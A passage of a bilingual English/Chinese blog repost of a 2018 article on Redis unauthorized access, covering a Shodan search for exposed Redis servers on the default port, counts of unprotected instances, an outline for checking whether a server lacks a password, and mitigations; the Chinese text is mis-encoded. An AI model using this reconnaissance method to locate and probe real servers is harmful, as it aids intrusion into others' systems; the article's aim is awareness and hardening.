<p>å¥½çš„ï¼Œæ­£å¦‚æˆ‘æåˆ°çš„ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> æ¥æœç´¢å…·æœ‰ Redis footprint(ç‰¹å¾)çš„æœåŠ¡å™¨ã€‚</p>
<p>Let us do a simple search by Redisâ€™ default port.</p>
<p>è®©æˆ‘ä»¬åšä¸€ä¸ªç®€å•çš„æœç´¢ï¼Œé€šè¿‡Redisçš„é»˜è®¤ç«¯å£ã€‚</p>
<p><img src="/img/review/0_ueth-xQWtxJobzwL.png" alt></p>
<p>Looks like we have 75,665 search results. Aaaaaand guess what! Right down there (not shown but we can see it if we scroll down) there are TONS of host that has NO password protection!!</p>
<p>çœ‹èµ·æ¥æˆ‘ä»¬æœ‰ 75,665 ä¸ªæœç´¢ç»“æœã€‚çŒœçŒœçœ‹!å°±åœ¨é‚£é‡Œ(æ²¡æœ‰æ˜¾ç¤ºï¼Œä½†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæˆ‘ä»¬å‘ä¸‹æ»šåŠ¨)æœ‰äº›ä¸»æœºæ²¡æœ‰å¯†ç ä¿æŠ¤!!</p>
<p>This vulnerability was found years ago and still countless of machines are opening up themselves in such an easy way for attackers to have fun in there serverâ€¦</p>
<p>è¿™ä¸ªæ¼æ´æ˜¯å‡ å¹´å‰å‘ç°çš„ï¼Œä»ç„¶æœ‰æ— æ•°çš„æœºå™¨ä»¥è¿™ç§ç®€å•çš„æ–¹å¼æ‰“å¼€è‡ªå·±ï¼Œè®©æ”»å‡»è€…åœ¨é‚£é‡Œçš„æœåŠ¡å™¨ä¸­å¾—åˆ°ä¹è¶£â€¦</p>
<p>According to Shodan, there are around <strong>56,000 unprotected</strong> Redis instances in 2015.</p>
<p>æ ¹æ® Shodan çš„æ•°æ®ï¼Œ2015 å¹´å¤§çº¦æœ‰ 5,6000 ä¸ªä¸å—ä¿æŠ¤çš„Rediså®ä¾‹ã€‚</p>
<p><img src="/img/review/0_C2n27eAOGFkK79IU.png" alt></p>
<p>According to ZoomEye, the distribution of the instances is.</p>
<p>æ ¹æ® ZoomEyeï¼Œå®ä¾‹çš„åˆ†å¸ƒæ˜¯ã€‚</p>
<p><img src="img/0_m19lcFYeFOhB_Nui.png" alt></p>
<p>According to ZoomEye, the top ranking countries of these instances are: China, USA, Germanyâ€¦</p>
<p>ZoomEyeè¡¨ç¤ºï¼Œè¿™äº›ä¾‹å­ä¸­æ’åæœ€é«˜çš„å›½å®¶æ˜¯:ä¸­å›½ã€ç¾å›½ã€å¾·å›½â€¦â€¦</p>
<p><img src="img/0_hxf9oaOFJVDohZMC.png" alt></p>
<p>Okay, back to the business. So how do we verify if a server is protected using python? It turns out to be fairly simple.</p>
<p>å¥½äº†ï¼Œå›åˆ°æ­£é¢˜ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•éªŒè¯æ˜¯å¦ä½¿ç”¨ python ä¿æŠ¤æœåŠ¡å™¨å‘¢ï¼Ÿç»“æœç›¸å½“ç®€å•ã€‚</p>
<ol>
<li>Use socket to connect to the target IP</li>
<li>Perform a GET request</li>
<li><p>If the server is unprotected, you GET request will succeed; otherwise it will fail</p>
</li>
<li><p>ä½¿ç”¨å¥—æ¥å­—è¿æ¥åˆ°ç›®æ ‡IP</p>
</li>
<li>æ‰§è¡ŒGETè¯·æ±‚</li>
<li>å¦‚æœæœåŠ¡å™¨ä¸å—ä¿æŠ¤ï¼Œæ‚¨çš„GETè¯·æ±‚å°†æˆåŠŸ;å¦åˆ™å°±ä¼šå¤±è´¥</li>
</ol>
<p><img src="img/0_C4_dcCGWAPWxFbaU.png" alt></p>
<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><h2 id="å‡è½»"><a href="#å‡è½»" class="headerlink" title="å‡è½»"></a>å‡è½»</h2><ul>
<li>Donâ€™t bind to 0.0.0.0</li>
<li>If you have to, change the default port (6379)</li>
<li><p>Set a password (for everything)</p>
</li>
<li><p>ä¸è¦ç»‘å®š 0.0.0.0</p>
</li>
<li>å¦‚æœæœ‰å¿…è¦çš„è¯ï¼Œä¿®æ”¹é»˜è®¤ç«¯å£ (6379)</li>
<li>ä¸ºæ‰€æœ‰çš„ Reids è®¾ç½®å¯†ç </li>
</ul>
<p>Sep 11, 2018 ï¼ˆ2018-09-11ï¼‰</p>
<p>author: Victor Zhu</p>
<p>link: <a href="https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419" target="_blank" rel="noopener">https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419</a></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>åšæŒåŸåˆ›æŠ€æœ¯åˆ†äº«ï¼Œæ‚¨çš„æ”¯æŒå°†é¼“åŠ±æˆ‘ç»§ç»­åˆ›ä½œï¼</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>æ‰“èµ</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/img/wechatpay.jpg" alt="jani å¾®ä¿¡æ”¯ä»˜">
        <p>å¾®ä¿¡æ”¯ä»˜</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/img/alipay.jpg" alt="jani æ”¯ä»˜å®">
        <p>æ”¯ä»˜å®</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/redis/" rel="tag"># redis</a>
          
            <a href="/tags/å®‰å…¨/" rel="tag"># å®‰å…¨</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/ç®—æ³•/reverse-integer/" rel="next" title="æ•´æ•°åè½¬">
                <i class="fa fa-chevron-left"></i> æ•´æ•°åè½¬
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/æ€è€ƒ/å¦‚ä½•å‡å°‘éœ€æ±‚ç†è§£çš„åå·®/" rel="prev" title="å¦‚ä½•å‡å°‘éœ€æ±‚ç†è§£çš„åå·®">
                å¦‚ä½•å‡å°‘éœ€æ±‚ç†è§£çš„åå·® <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            æ–‡ç« ç›®å½•
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            ç«™ç‚¹æ¦‚è§ˆ
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/img/12641322.jpg" alt="jani">
            
              <p class="site-author-name" itemprop="name">jani</p>
              <p class="site-description motion-element" itemprop="description">ä¸€èµ·å­¦ä¹ ï¼Œä¸€èµ·è¿›æ­¥</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">27</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/test-lin" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:liberty_linlin@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Simulation"><span class="nav-number">1.</span> <span class="nav-text">Simulation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æ¨¡æ‹Ÿ"><span class="nav-number">2.</span> <span class="nav-text">æ¨¡æ‹Ÿ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Set-Up-Target-Machine"><span class="nav-number">2.1.</span> <span class="nav-text">Set Up Target Machine:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#è®¾å®šç›®æ ‡æœºå™¨ï¼š"><span class="nav-number">2.2.</span> <span class="nav-text">è®¾å®šç›®æ ‡æœºå™¨ï¼š</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Attack-Machine"><span class="nav-number">2.3.</span> <span class="nav-text">Attack Machine:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#æ”»å‡»æœºå™¨ï¼š"><span class="nav-number">2.4.</span> <span class="nav-text">æ”»å‡»æœºå™¨ï¼š</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Harvest-Time"><span class="nav-number">2.5.</span> <span class="nav-text">Harvest Time</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ç»“æœæ—¶é—´"><span class="nav-number">2.6.</span> <span class="nav-text">ç»“æœæ—¶é—´</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-Search-Engine-to-find-Vulnerable-Redis-Servers"><span class="nav-number">3.</span> <span class="nav-text">Use Search Engine to find Vulnerable Redis Servers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨"><span class="nav-number">4.</span> <span class="nav-text">ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mitigation"><span class="nav-number">5.</span> <span class="nav-text">Mitigation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#å‡è½»"><span class="nav-number">6.</span> <span class="nav-text">å‡è½»</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">jani</span>

  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
